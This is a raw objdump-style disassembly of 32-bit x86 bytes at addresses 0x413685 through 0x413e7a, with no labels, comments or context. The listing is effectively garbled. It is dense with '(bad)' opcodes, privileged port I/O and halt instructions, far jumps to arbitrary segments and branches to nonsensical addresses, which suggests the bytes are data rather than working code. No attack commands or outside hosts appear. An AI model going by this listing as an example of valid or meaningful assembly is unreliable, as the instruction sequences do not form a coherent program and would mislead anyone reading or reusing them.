  413685:	mov    dl,BYTE PTR [esi+eiz*8+0x6d4f2901]
  41368c:	hlt    
  41368d:	add    eax,0xce97ee34
  413692:	retf   0x1323
  413695:	pop    ebx
  413696:	iret   
  413697:	daa    
  413698:	aaa    
  413699:	or     DWORD PTR [edx+ebx*1-0x54],ecx
  41369d:	mov    ch,0xa6
  41369f:	jae    0x41364e
  4136a1:	mov    ah,0xf8
  4136a3:	pop    edi
  4136a4:	pop    ecx
  4136a5:	dec    eax
  4136a6:	xor    DWORD PTR [ecx-0x69fe4c20],ebp
  4136ac:	outs   dx,DWORD PTR ds:[esi]
  4136ad:	les    esi,FWORD PTR [ebp-0x77]
  4136b0:	out    dx,al
  4136b1:	dec    edi
  4136b2:	pop    es
  4136b3:	mov    fs,WORD PTR [ebx+0x1d30c03c]
  4136b9:	std    
  4136ba:	test   al,0x7f
  4136bc:	lods   al,BYTE PTR ds:[esi]
  4136bd:	inc    ebp
  4136be:	lea    edx,[ebp+0x5d721026]
  4136c4:	pop    esi
  4136c5:	jbe    0x41366e
  4136c7:	and    cl,bh
  4136c9:	add    bh,BYTE PTR [ebp-0x28396529]
  4136cf:	dec    edi
  4136d0:	push   cs
  4136d1:	and    ah,BYTE PTR [edi-0x77a069e9]
  4136d7:	pushf  
  4136d8:	(bad)  
  4136d9:	jns    0x413691
  4136db:	lds    eax,FWORD PTR [esp+eiz*2+0x2f]
  4136df:	inc    edx
  4136e0:	pop    eax
  4136e1:	inc    ebx
  4136e2:	aam    0x17
  4136e4:	inc    ebx
  4136e5:	sbb    BYTE PTR [esi+0x21],bl
  4136e8:	es inc edx
  4136ea:	push   esi
  4136eb:	xorps  xmm4,XMMWORD PTR [eax-0x6dc87f56]
  4136f2:	pop    esi
  4136f3:	fnstsw WORD PTR [ebx+0x51]
  4136f6:	push   cs
  4136f7:	gs in  eax,dx
  4136f9:	repnz test al,0x3a
  4136fc:	test   DWORD PTR [ebp+eax*4+0x7a2da020],0xe9e42138
  413707:	xor    BYTE PTR [edx+0x1a5d85ca],bl
  41370d:	aaa    
  41370e:	inc    edi
  41370f:	inc    ecx
  413710:	mov    edx,0xa82ba85f
  413715:	neg    DWORD PTR [edi-0x692f2696]
  41371b:	scas   eax,DWORD PTR es:[edi]
  41371c:	aam    0xef
  41371e:	xlat   BYTE PTR ds:[ebx]
  41371f:	(bad)  
  413720:	fstp   QWORD PTR [eax+0x33]
  413723:	pop    esi
  413724:	lods   al,BYTE PTR ds:[esi]
  413725:	pusha  
  413726:	int3   
  413727:	sbb    al,0x59
  413729:	push   cs
  41372a:	mov    ecx,0x19a1d077
  41372f:	jns    0x413713
  413731:	fwait
  413732:	dec    ebp
  413733:	in     eax,0xbc
  413735:	imul   edi,DWORD PTR [ebx],0x76e653bb
  41373b:	cld    
  41373c:	sti    
  41373d:	lock xchg DWORD PTR ds:0xa899fd7,ebp
  413744:	add    bl,BYTE PTR [ebp+0x41]
  413747:	lahf   
  413748:	out    dx,al
  413749:	hlt    
  41374a:	jmp    0x413739
  41374c:	fidivr DWORD PTR es:[edi]
  41374f:	shr    DWORD PTR ds:0x16d7a13b,1
  413755:	adc    al,BYTE PTR [eax]
  413757:	mov    eax,0xbd010225
  41375c:	pop    esi
  41375d:	and    cl,BYTE PTR [ebx+0x44de8ab5]
  413763:	jmp    0x413716
  413765:	push   0x69
  413767:	jo     0x413767
  413769:	add    eax,0x16951f5d
  41376e:	retf   0x5dec
  413771:	push   es
  413772:	aad    0x87
  413774:	lock call 0x11af:0xd78d1599
  41377c:	fisubr WORD PTR [edx]
  41377e:	sahf   
  41377f:	popa   
  413780:	stos   BYTE PTR es:[edi],al
  413781:	adc    dh,BYTE PTR [ebx-0x64]
  413784:	push   0xeb15a901
  413789:	push   ecx
  41378a:	mov    ebp,0x39f49814
  41378f:	iret   
  413790:	or     al,0x95
  413792:	lea    esp,[edx-0x59]
  413795:	lods   al,BYTE PTR ds:[esi]
  413796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413797:	mov    ds:0x2aaa41b7,eax
  41379c:	hlt    
  41379d:	jmp    0xceee:0x33a67b91
  4137a4:	dec    esi
  4137a5:	inc    edx
  4137a6:	lods   eax,DWORD PTR ds:[esi]
  4137a7:	mov    bh,0x79
  4137a9:	pop    edx
  4137aa:	push   esp
  4137ab:	popf   
  4137ac:	inc    esp
  4137ad:	pop    es
  4137ae:	fnstcw WORD PTR [esi-0x446e4e0]
  4137b4:	cmc    
  4137b5:	inc    ebp
  4137b6:	cmc    
  4137b7:	loopne 0x413793
  4137b9:	in     eax,0x36
  4137bb:	xchg   esp,eax
  4137bc:	fisttp DWORD PTR [ebx]
  4137be:	cmp    al,0xa2
  4137c0:	inc    edx
  4137c1:	cmp    BYTE PTR [ebx],0xf9
  4137c4:	in     al,dx
  4137c5:	(bad)  
  4137c6:	into   
  4137c7:	xor    al,0xf2
  4137c9:	mov    BYTE PTR [ebx],ah
  4137cb:	sbb    BYTE PTR [ebp-0x5],dl
  4137ce:	cmc    
  4137cf:	arpl   WORD PTR [ecx-0x5975c010],dx
  4137d5:	int3   
  4137d6:	addr16 pop ds
  4137d8:	mov    ds,WORD PTR [edi]
  4137da:	pop    edi
  4137db:	and    ebp,esp
  4137dd:	jl     0x247bf03d
  4137e3:	pop    ebp
  4137e4:	(bad)  
  4137e5:	aad    0x4f
  4137e7:	xor    eax,0x6370f96a
  4137ec:	inc    esi
  4137ed:	sub    DWORD PTR [esi-0x50d41ae4],edx
  4137f3:	adc    al,0x7a
  4137f5:	iret   
  4137f6:	inc    esp
  4137f7:	adc    eax,0x6440a4f5
  4137fc:	lahf   
  4137fd:	sbb    DWORD PTR es:[ebp-0x2d2d8fca],ebp
  413804:	mov    ecx,0xf8aae8cb
  413809:	addr16 jmp 0x92a3:0x304c8843
  413811:	dec    ebp
  413812:	pop    ebx
  413813:	ss sub al,0x91
  413816:	adc    BYTE PTR [esi-0x6b96904e],ch
  41381c:	push   esi
  41381d:	aad    0x68
  41381f:	inc    esp
  413820:	fwait
  413821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413822:	test   eax,0xefd9eeef
  413827:	pop    esp
  413828:	in     al,0xa
  41382a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41382b:	pop    es
  41382c:	xor    eax,0xe2851dff
  413831:	retf   0x29ce
  413834:	test   BYTE PTR [esi],ah
  413836:	fiadd  WORD PTR [eax]
  413838:	lods   al,BYTE PTR ds:[esi]
  413839:	jp     0x4137f3
  41383b:	xor    eax,0xe166fc07
  413840:	mov    ds:0x1695c639,eax
  413845:	pop    ebx
  413846:	out    dx,al
  413847:	jecxz  0x4137d9
  413849:	inc    edx
  41384a:	aaa    
  41384b:	sub    ah,BYTE PTR [edi-0x70]
  41384e:	aam    0x3
  413850:	xchg   esi,eax
  413851:	sti    
  413852:	lods   al,BYTE PTR ds:[esi]
  413853:	inc    edi
  413854:	pop    esp
  413855:	pushf  
  413856:	std    
  413857:	jbe    0x4138b2
  413859:	add    eax,0x3f9c5a90
  41385e:	test   eax,0xd99d9da2
  413863:	or     DWORD PTR [esp+eax*4+0x70],eax
  413867:	inc    edi
  413868:	pop    ss
  413869:	mov    ah,0x7c
  41386b:	mov    eax,0x4cdfbe85
  413870:	addr16 cdq 
  413872:	push   edi
  413873:	ror    DWORD PTR ds:[edx+eiz*1+0x3e84f24d],cl
  41387b:	and    al,0x54
  41387d:	push   esi
  41387e:	aad    0x42
  413880:	dec    ebp
  413881:	xlat   BYTE PTR ds:[ebx]
  413882:	mov    eax,ds:0x4583f0ea
  413887:	and    eax,0x4bdace71
  41388c:	cmp    eax,0xa7b17e5b
  413891:	cmp    ebx,DWORD PTR [esi-0x1e]
  413894:	mov    ch,0x8c
  413896:	adc    dl,BYTE PTR [ebx]
  413898:	fstp   TBYTE PTR [edx+0x1a]
  41389b:	cmp    DWORD PTR [ebp+0x25],ebp
  41389e:	shl    DWORD PTR [ecx-0x5d],0x27
  4138a2:	sub    cl,dl
  4138a4:	retf   0x42cc
  4138a7:	and    eax,0x2c424c85
  4138ac:	push   0x318c304d
  4138b1:	jg     0x4138ef
  4138b3:	int3   
  4138b4:	fs xchg ebx,eax
  4138b6:	out    0xac,al
  4138b8:	pop    ds
  4138b9:	test   DWORD PTR [ecx*4-0x48846773],esi
  4138c0:	or     al,dl
  4138c2:	dec    edi
  4138c3:	int    0xe4
  4138c5:	adc    edi,DWORD PTR [esi-0x6d]
  4138c8:	(bad)  
  4138c9:	(bad)  
  4138cb:	jge    0x4138ac
  4138cd:	shr    ch,0xbd
  4138d0:	sbb    dh,al
  4138d2:	inc    ebx
  4138d3:	lock sti 
  4138d5:	inc    eax
  4138d6:	icebp  
  4138d7:	push   0x75073694
  4138dc:	pop    esi
  4138dd:	aam    0x93
  4138df:	push   es
  4138e0:	aad    0x64
  4138e2:	jle    0x4138a8
  4138e4:	pop    ebx
  4138e5:	push   0xcbaf58cb
  4138ea:	and    ebp,DWORD PTR [ebp-0x5821f96c]
  4138f0:	pop    ebx
  4138f1:	std    
  4138f2:	call   0xd7ed8c4c
  4138f7:	cmp    edi,DWORD PTR [ecx+0x14]
  4138fa:	(bad)  
  4138fb:	sti    
  4138fc:	aad    0xd7
  4138fe:	test   DWORD PTR [ebx],edx
  413900:	adc    BYTE PTR [edi-0x55d57042],0x5
  413907:	scas   eax,DWORD PTR es:[edi]
  413908:	xchg   esp,eax
  413909:	xchg   esi,eax
  41390a:	shl    BYTE PTR [edx],0xd8
  41390d:	cli    
  41390e:	(bad)  
  41390f:	stos   BYTE PTR es:[edi],al
  413910:	enter  0x92d3,0xd5
  413914:	pusha  
  413915:	jo     0x4138d8
  413917:	shl    ebp,cl
  413919:	shr    bl,cl
  41391b:	cs sub bl,ah
  41391e:	xchg   ebx,eax
  41391f:	lahf   
  413920:	xchg   DWORD PTR [edi+ebp*8+0x1b],eax
  413924:	push   ss
  413925:	sbb    esp,DWORD PTR [ebp-0x43]
  413928:	jnp    0x4138f9
  41392a:	je     0x4138ba
  41392c:	jae    0x4138ea
  41392e:	jecxz  0x41391f
  413930:	mov    al,0xc2
  413932:	sbb    DWORD PTR [ebp-0x2f],esp
  413935:	pop    edi
  413936:	outs   dx,BYTE PTR ds:[esi]
  413937:	adc    al,dl
  413939:	mov    cl,0x80
  41393b:	cmp    BYTE PTR cs:[eax+0x2b98663d],0x0
  413943:	sub    al,0x1e
  413945:	fistp  QWORD PTR [esi+0x6fba00b5]
  41394b:	test   al,0xfc
  41394d:	sbb    BYTE PTR [esp+ecx*8],0xc8
  413951:	fist   WORD PTR [edx-0x15]
  413954:	and    eax,0x3a90872
  413959:	in     al,0x0
  41395b:	clc    
  41395c:	xchg   esi,eax
  41395d:	enter  0x6c5f,0x99
  413961:	imul   DWORD PTR [ecx-0x3b7ca5a5]
  413967:	cld    
  413968:	jecxz  0x4139e2
  41396a:	mov    edx,fs
  41396c:	dec    ebp
  41396d:	add    eax,0xa90f2c01
  413972:	stos   BYTE PTR es:[edi],al
  413973:	pop    DWORD PTR ds:0x5476dcd7
  413979:	xchg   ebp,eax
  41397a:	out    dx,al
  41397b:	inc    ebx
  41397c:	inc    esp
  41397d:	cmp    eax,0x64372449
  413982:	sbb    dh,BYTE PTR [edi]
  413984:	cwde   
  413985:	pusha  
  413986:	pop    ss
  413987:	test   DWORD PTR [esi+esi*4],eax
  41398a:	jmp    0xc055:0xaffc9f67
  413991:	dec    ecx
  413992:	sbb    eax,0x2b2cf778
  413997:	mov    ebx,DWORD PTR [edi+0x6b]
  41399a:	jo     0x4139bf
  41399c:	(bad)  
  41399d:	div    ebp
  41399f:	jbe    0x4139d7
  4139a1:	es push eax
  4139a3:	or     DWORD PTR [ecx-0x36],edi
  4139a6:	rol    DWORD PTR [esi-0x62dd7f34],0x42
  4139ad:	push   es
  4139ae:	sahf   
  4139af:	clc    
  4139b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139b1:	mov    al,0xe5
  4139b3:	sbb    eax,DWORD PTR [ebp+0x6a167623]
  4139b9:	fdivr  st,st(6)
  4139bb:	cmc    
  4139bc:	pop    ebp
  4139bd:	imul   esp,DWORD PTR [ecx],0xffffffb0
  4139c0:	test   BYTE PTR [ecx],0x30
  4139c3:	sbb    bh,BYTE PTR [ebx]
  4139c5:	shl    edx,0xe3
  4139c8:	imul   ebx,DWORD PTR [ebx+0x5049c2c8],0x5f
  4139cf:	adc    al,0x1d
  4139d1:	mov    bh,0x6d
  4139d3:	jl     0x413a34
  4139d5:	push   esp
  4139d6:	(bad)  
  4139d7:	test   ah,0xeb
  4139da:	(bad)  
  4139db:	cmc    
  4139dc:	mov    edi,0x3423346
  4139e1:	hlt    
  4139e2:	cmp    al,0xb2
  4139e4:	pushf  
  4139e5:	inc    eax
  4139e6:	mov    eax,ds:0x2122304e
  4139eb:	sub    edx,DWORD PTR [edx+0x53]
  4139ee:	retf   0x8470
  4139f1:	xchg   ecx,eax
  4139f2:	lea    eax,ds:0x426966
  4139f8:	jmp    0x413f03
  4139fd:	aas    
  4139fe:	(bad)
  413a01:	(bad)  
  413a02:	aas    
  413a03:	(bad)
  413a06:	or     ecx,DWORD PTR [eax+0xc]
  413a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a0a:	pop    ds
  413a0b:	cli    
  413a0c:	jb     0x413a72
  413a0e:	sbb    edi,DWORD PTR [edi+0x78]
  413a11:	push   0x7c
  413a13:	js     0x413a8d
  413a15:	rcr    BYTE PTR [eax-0x7408ab0a],0x59
  413a1c:	fnstsw WORD PTR [ebx+ecx*8-0x7c]
  413a20:	fninit 
  413a22:	push   eax
  413a23:	xor    dh,ah
  413a25:	dec    esi
  413a26:	jae    0x413a33
  413a28:	fdecstp 
  413a2a:	stos   DWORD PTR es:[edi],eax
  413a2b:	push   eax
  413a2c:	stos   DWORD PTR es:[edi],eax
  413a2d:	stos   BYTE PTR es:[edi],al
  413a2e:	push   ebx
  413a2f:	pop    ecx
  413a30:	sbb    eax,0x8e5705c7
  413a35:	out    dx,al
  413a36:	push   edi
  413a37:	out    dx,al
  413a38:	clc    
  413a39:	fdivr  DWORD PTR [ebp+eiz*4+0x46]
  413a3d:	aad    0xe0
  413a3f:	fsubr  DWORD PTR [ebx-0x5d]
  413a42:	mov    ds:0xc530f340,al
  413a47:	dec    ebx
  413a48:	jnp    0x413a67
  413a4a:	imul   eax,DWORD PTR [ebx+0xc02463],0x64ff47a2
  413a54:	rcr    DWORD PTR [edx+eiz*2+0x55dfa65d],cl
  413a5b:	mov    esi,0xa2d94b13
  413a60:	shl    BYTE PTR [ebp-0x39a96797],0xa
  413a67:	xchg   esp,eax
  413a68:	cli    
  413a69:	jb     0x413aa4
  413a6b:	add    dl,dl
  413a6d:	inc    ecx
  413a6e:	pop    ebp
  413a6f:	adc    BYTE PTR [ebx],ah
  413a71:	(bad)  
  413a72:	rcl    BYTE PTR [eax-0x5b],cl
  413a75:	mov    ah,0xae
  413a77:	test   eax,0x1cb3624
  413a7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a7d:	mov    al,ds:0xa83ce5e7
  413a82:	sbb    bl,cl
  413a84:	xchg   ebx,eax
  413a85:	dec    eax
  413a86:	push   eax
  413a87:	loope  0x413a0e
  413a89:	imul   edi,ebp,0x444dd071
  413a8f:	pop    ds
  413a90:	mov    al,ds:0x5904216e
  413a95:	push   ebx
  413a96:	arpl   bp,si
  413a98:	fistp  QWORD PTR [esi-0x67]
  413a9b:	js     0x413af8
  413a9d:	pop    es
  413a9e:	sub    esp,esi
  413aa0:	jae    0x413b10
  413aa2:	retf   
  413aa3:	mov    bl,0x45
  413aa5:	mov    ebp,DWORD PTR es:[ebp+0x731fdbe1]
  413aac:	imul   eax,esi,0x4a6f5c82
  413ab2:	sar    BYTE PTR [edi],0xe9
  413ab5:	dec    edx
  413ab6:	or     al,0x4f
  413ab8:	push   ebx
  413ab9:	mov    ds:0x911156ae,al
  413abe:	clc    
  413abf:	cmp    BYTE PTR [eax-0x7e56d12c],bh
  413ac5:	and    eax,0x41f3de1d
  413aca:	std    
  413acb:	das    
  413acc:	or     eax,0x8e1274d1
  413ad1:	dec    eax
  413ad2:	sar    BYTE PTR [ecx+0x2c],1
  413ad5:	push   es
  413ad6:	push   0x16
  413ad8:	dec    ebp
  413ad9:	xor    BYTE PTR [edi+0x6045cf56],ch
  413adf:	push   edi
  413ae0:	test   BYTE PTR [esi+0x6a],bl
  413ae3:	cdq    
  413ae4:	cli    
  413ae5:	iret   
  413ae6:	xchg   ebx,eax
  413ae7:	into   
  413ae8:	xor    DWORD PTR [edi+0x6b],0x47
  413aec:	popf   
  413aed:	inc    esp
  413aee:	xor    bh,al
  413af0:	mul    BYTE PTR [eax]
  413af2:	and    ch,BYTE PTR [eax-0x2b]
  413af5:	loope  0x413b1f
  413af7:	and    al,0x67
  413af9:	jb     0x413b54
  413afb:	jb     0x413b51
  413afd:	shl    esi,0xd6
  413b00:	int3   
  413b01:	and    DWORD PTR [eax-0x487995ed],0x2c
  413b08:	test   bh,0x78
  413b0b:	xchg   esi,ebp
  413b0d:	rol    ecx,1
  413b0f:	mov    eax,ds:0x6f5b2d80
  413b14:	frstor [eax]
  413b16:	sbb    DWORD PTR [ebx+0x3d],0xffffffcb
  413b1a:	out    dx,eax
  413b1b:	mov    DWORD PTR [eax-0x288ee610],edx
  413b21:	jo     0x413ab2
  413b23:	test   DWORD PTR [eax+0x7c430bba],0xc23ac140
  413b2d:	xor    DWORD PTR ds:0x5e516d2a,edx
  413b33:	push   esi
  413b34:	cs mov esi,0xc96fac72
  413b3a:	lods   al,BYTE PTR ds:[esi]
  413b3b:	das    
  413b3c:	ret    
  413b3d:	adc    eax,0x568a3049
  413b42:	lds    eax,FWORD PTR [esi]
  413b44:	cmp    BYTE PTR [ecx-0x64c7a64b],ch
  413b4a:	(bad)  
  413b4b:	lock add eax,0xad612ff5
  413b51:	mov    dl,0xa8
  413b53:	xchg   ebx,eax
  413b54:	adc    BYTE PTR [edx+eiz*8-0x365187a8],cl
  413b5b:	mov    edx,0xc0fa7b06
  413b60:	add    ah,bl
  413b62:	jmp    0x2338:0xa2b95ece
  413b69:	test   DWORD PTR [edi+0x53],esp
  413b6c:	mov    edi,0x54618c28
  413b71:	out    0xb7,eax
  413b73:	dec    edx
  413b74:	cdq    
  413b75:	jp     0x88e567f5
  413b7b:	cmp    dl,BYTE PTR [eax]
  413b7d:	iretw  
  413b7f:	push   edx
  413b80:	clc    
  413b81:	je     0x413b85
  413b83:	push   esp
  413b84:	jns    0x413b98
  413b86:	je     0x413b98
  413b88:	dec    ebp
  413b89:	test   BYTE PTR [esi-0x62],dh
  413b8c:	nop
  413b8d:	cmc    
  413b8e:	pop    ds
  413b8f:	enter  0x15f0,0xff
  413b93:	shl    DWORD PTR [ebx-0x6bdad7ce],1
  413b99:	or     cl,cl
  413b9b:	jge    0x413c0c
  413b9d:	dec    edi
  413b9e:	mov    ch,0x39
  413ba0:	xchg   ebx,eax
  413ba1:	cmp    DWORD PTR [ecx+ecx*1-0x4ad98bf],edi
  413ba8:	sub    al,0x6c
  413baa:	(bad)  
  413bab:	mov    esp,0x2cfc889a
  413bb0:	or     esp,DWORD PTR [ebp-0x64]
  413bb3:	jno    0x413b7b
  413bb5:	rol    ch,1
  413bb7:	shl    esi,cl
  413bb9:	hlt    
  413bba:	(bad)  
  413bbb:	ror    DWORD PTR [ebx-0x1],cl
  413bbe:	rcl    DWORD PTR [edx-0x181736f0],0xd8
  413bc5:	aad    0xaa
  413bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc8:	jae    0x413c09
  413bca:	in     eax,dx
  413bcb:	inc    esp
  413bcc:	pushf  
  413bcd:	out    dx,al
  413bce:	(bad)  
  413bcf:	in     al,dx
  413bd0:	push   es
  413bd1:	pop    es
  413bd2:	rcl    BYTE PTR [edi],1
  413bd4:	xchg   esp,ecx
  413bd6:	adc    DWORD PTR [eax+ecx*2+0x35a1e5d8],ebx
  413bdd:	sbb    eax,0xe3dc09fa
  413be2:	add    eax,0x4f1a0fe2
  413be7:	pop    edi
  413be8:	cmc    
  413be9:	cwde   
  413bea:	push   0x668dc1a7
  413bef:	inc    edx
  413bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bf1:	jmp    0x2514:0x6c7b1c43
  413bf8:	mov    bh,0x34
  413bfa:	pop    eax
  413bfb:	icebp  
  413bfc:	add    edx,esi
  413bfe:	cli    
  413bff:	dec    esi
  413c00:	icebp  
  413c01:	sbb    esi,DWORD PTR [esi-0x73]
  413c04:	pop    eax
  413c05:	je     0x413c3f
  413c07:	das    
  413c08:	clc    
  413c09:	repnz in eax,0x88
  413c0c:	sub    DWORD PTR [ecx+0x3c3702cf],eax
  413c12:	sbb    edi,ecx
  413c14:	and    DWORD PTR [edi-0x452ef402],edi
  413c1a:	mov    edi,0x6a399033
  413c1f:	xor    eax,0x6100cf82
  413c24:	push   es
  413c25:	pop    es
  413c26:	cld    
  413c27:	fmul   QWORD PTR [ebx-0x63]
  413c2a:	add    BYTE PTR [esp+ebp*8],0xd8
  413c2e:	jge    0x413c3d
  413c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c31:	in     al,0x59
  413c33:	sub    al,0x79
  413c35:	or     al,BYTE PTR [esi]
  413c37:	(bad)  
  413c38:	sbb    al,0xd2
  413c3a:	scas   eax,DWORD PTR es:[edi]
  413c3b:	fld    DWORD PTR [eax+0x7a88f8c6]
  413c41:	add    al,BYTE PTR [esi+esi*8]
  413c44:	xchg   esi,eax
  413c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c46:	mov    WORD PTR [eax+edx*1-0x19],fs
  413c4a:	int    0xf
  413c4c:	out    0x6,eax
  413c4e:	dec    esp
  413c4f:	loope  0x413c49
  413c51:	jb     0x413c5b
  413c53:	ins    DWORD PTR es:[edi],dx
  413c54:	pop    eax
  413c55:	sbb    DWORD PTR ds:0x516de5b7,0x7e
  413c5c:	in     al,0x6b
  413c5e:	pop    edx
  413c5f:	repz ss mov ebx,0x7b98da49
  413c66:	sahf   
  413c67:	lock div ebx
  413c6a:	mov    ecx,0x60d7e6bd
  413c6f:	cmp    BYTE PTR [ebx+0x12],cl
  413c72:	mov    edx,0xc6c9047c
  413c77:	jae    0x413c3d
  413c79:	dec    ecx
  413c7a:	test   BYTE PTR [ebp-0x2a],0x75
  413c7e:	mov    cl,0xf8
  413c80:	out    dx,al
  413c81:	data16 stc 
  413c83:	icebp  
  413c84:	(bad)  
  413c85:	push   eax
  413c86:	inc    edx
  413c87:	inc    edi
  413c88:	(bad)  
  413c89:	and    bl,BYTE PTR [ebp-0x42]
  413c8c:	mov    esp,0xba4acb40
  413c91:	push   0xffffffc0
  413c93:	inc    ecx
  413c94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c95:	idiv   BYTE PTR [edx-0x64270a9d]
  413c9b:	out    dx,al
  413c9c:	jl     0x413ce7
  413c9e:	add    al,0xdf
  413ca0:	jle    0x413ce2
  413ca2:	push   0xc9970052
  413ca7:	aad    0xd4
  413ca9:	gs jo  0x413c4e
  413cac:	pop    edx
  413cad:	ins    DWORD PTR es:[edi],dx
  413cae:	sbb    al,0x10
  413cb0:	mov    BYTE PTR [esi-0x758ae61d],dh
  413cb6:	or     eax,0x89de975d
  413cbb:	test   eax,0x99a921fc
  413cc0:	fneni(8087 only) 
  413cc2:	add    eax,DWORD PTR [esi-0x3abafb80]
  413cc8:	aad    0x7b
  413cca:	adc    eax,0x3e45b454
  413ccf:	or     BYTE PTR [ecx-0x19],0x90
  413cd3:	lds    ecx,FWORD PTR [ebx-0x2c]
  413cd6:	add    DWORD PTR [eax-0x60],eax
  413cd9:	mov    ecx,0x5fc0884
  413cde:	mov    esp,0x7d21a056
  413ce3:	test   cl,0xb3
  413ce6:	mov    ds:0x783127d7,eax
  413ceb:	xchg   BYTE PTR [ecx],dl
  413ced:	mov    ah,0x78
  413cef:	mov    edi,0x4b8d062b
  413cf4:	fmul   st,st(4)
  413cf6:	and    BYTE PTR [ecx+0x5d],dh
  413cf9:	rol    ah,0x2b
  413cfc:	pop    edx
  413cfd:	jnp    0x413d61
  413cff:	daa    
  413d00:	inc    edx
  413d01:	add    al,0xf8
  413d03:	sbb    DWORD PTR [edi-0x67],ebx
  413d06:	xor    BYTE PTR [esi],cl
  413d08:	lahf   
  413d09:	sbb    al,0xaa
  413d0b:	push   ecx
  413d0c:	pop    esp
  413d0d:	sub    edx,edi
  413d0f:	mov    bl,0xd4
  413d11:	aam    0xd8
  413d13:	call   0xa51e:0x66a2ef99
  413d1a:	fnstsw WORD PTR [ebx-0x7e7c7c2f]
  413d20:	cs inc ecx
  413d22:	iret   
  413d23:	fistp  QWORD PTR [edi]
  413d25:	sbb    ecx,eax
  413d27:	jne    0x413cf1
  413d29:	lahf   
  413d2a:	and    DWORD PTR [esi+0x73],ebx
  413d2d:	leave  
  413d2e:	and    DWORD PTR [eax+0x31],edx
  413d31:	in     eax,0x76
  413d33:	sub    al,0x99
  413d35:	ins    BYTE PTR es:[edi],dx
  413d36:	stos   BYTE PTR es:[edi],al
  413d37:	nop
  413d38:	xchg   edi,eax
  413d39:	outs   dx,BYTE PTR ds:[esi]
  413d3a:	mov    ecx,0x37c6767a
  413d3f:	push   cs
  413d40:	mov    edx,DWORD PTR [ebx-0x7462e99f]
  413d46:	aaa    
  413d47:	std    
  413d48:	in     eax,dx
  413d49:	fwait
  413d4a:	stos   BYTE PTR es:[edi],al
  413d4b:	push   esi
  413d4c:	mov    edi,0x2421cfc4
  413d51:	nop
  413d52:	outs   dx,DWORD PTR ds:[esi]
  413d53:	or     edx,esp
  413d55:	aas    
  413d56:	push   esp
  413d57:	or     al,0x37
  413d59:	xor    dl,BYTE PTR [eax]
  413d5b:	dec    esp
  413d5c:	ds loop 0x413dd1
  413d5f:	pop    ebp
  413d60:	enter  0xf3e6,0x95
  413d64:	loopne 0x413d21
  413d66:	jl     0x413d8c
  413d68:	cwde   
  413d69:	adc    eax,0x3131b362
  413d6e:	outs   dx,DWORD PTR ds:[esi]
  413d6f:	(bad)
  413d72:	adc    esp,DWORD PTR [eax+ebx*2]
  413d75:	dec    esp
  413d76:	add    DWORD PTR [ebx+0x7db08364],esp
  413d7c:	es test eax,0xffc6199f
  413d82:	mov    al,0x2f
  413d84:	mov    ch,0x47
  413d86:	dec    ecx
  413d87:	call   0x2e4c5042
  413d8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d8d:	gs jmp 0x413d8b
  413d90:	pop    ss
  413d91:	sub    eax,0x97913ea8
  413d96:	push   edi
  413d97:	inc    eax
  413d98:	inc    esp
  413d99:	add    eax,0x18e4f513
  413d9e:	test   al,0xb3
  413da0:	or     BYTE PTR [esi-0x20c1742],ch
  413da6:	add    esi,ecx
  413da8:	inc    edx
  413da9:	or     BYTE PTR [ebp-0x25],ah
  413dac:	sbb    BYTE PTR [ebx+0x40],ah
  413daf:	mov    al,ds:0x2370cb97
  413db4:	sar    BYTE PTR [esi+0xd53d144],1
  413dba:	adc    eax,DWORD PTR cs:[ecx]
  413dbd:	mov    cl,0x6
  413dbf:	ds sbb dh,dl
  413dc2:	(bad)  
  413dc4:	jnp    0x413e01
  413dc6:	repnz pop edx
  413dc8:	adc    bh,BYTE PTR [di+0x50c6]
  413dcd:	xchg   DWORD PTR [edi+ebp*8+0x40adcb59],edi
  413dd4:	mov    ds:0x454827f3,eax
  413dd9:	xlat   BYTE PTR ds:[ebx]
  413dda:	arpl   WORD PTR [ebp+0x3c],cx
  413ddd:	dec    eax
  413dde:	pop    ss
  413ddf:	jle    0x413d8c
  413de1:	pusha  
  413de2:	cld    
  413de3:	js     0x413dad
  413de5:	push   esi
  413de6:	mov    al,ds:0xe91e7b3e
  413deb:	inc    ecx
  413dec:	ins    BYTE PTR es:[edi],dx
  413ded:	pop    edi
  413dee:	sbb    eax,0x148c83f
  413df3:	inc    edi
  413df4:	jg     0x413e21
  413df6:	mov    eax,0x5d269f00
  413dfb:	enter  0x52b5,0xc
  413dff:	mov    ecx,0xf3729c9e
  413e04:	sti    
  413e05:	mov    edx,0x3f7c5bb3
  413e0a:	cmp    eax,0x332d9d2
  413e0f:	cmp    DWORD PTR ds:0xf4d88597,esi
  413e15:	arpl   WORD PTR [ecx-0x71],sp
  413e18:	lock lock jno 0x413def
  413e1c:	jp     0x413dbd
  413e1e:	mov    ecx,0x420bf49f
  413e23:	cdq    
  413e24:	adc    eax,0x74c2a2e0
  413e29:	xor    DWORD PTR [edi+0x7f],eax
  413e2c:	int    0xc6
  413e2e:	or     bl,BYTE PTR [esi]
  413e30:	and    esi,esp
  413e32:	mov    bl,0x66
  413e34:	cli    
  413e35:	aad    0x7
  413e37:	sbb    al,0xd6
  413e39:	sub    dl,BYTE PTR [ebx-0x3a706f25]
  413e3f:	jmp    0xafe8:0xed228f67
  413e46:	mov    esp,0xe0c89822
  413e4b:	mov    eax,0x15354250
  413e50:	loopne 0x413eb3
  413e52:	lds    ecx,FWORD PTR [esi+0x32]
  413e55:	xor    al,0xf1
  413e57:	pushf  
  413e58:	dec    ecx
  413e59:	mov    eax,0x2b3c13da
  413e5e:	adc    cl,cl
  413e60:	mov    edi,0x3d2784fe
  413e65:	aas    
  413e66:	repz int3 
  413e68:	mov    esi,0x1879ff70
  413e6d:	mov    esp,0xfbcdcb0d
  413e72:	shl    dl,cl
  413e74:	jle    0x413ebd
  413e76:	xor    BYTE PTR [esi-0x12],al
  413e79:	aas    
  413e7a:	mov    BYTE PTR [ecx],cl
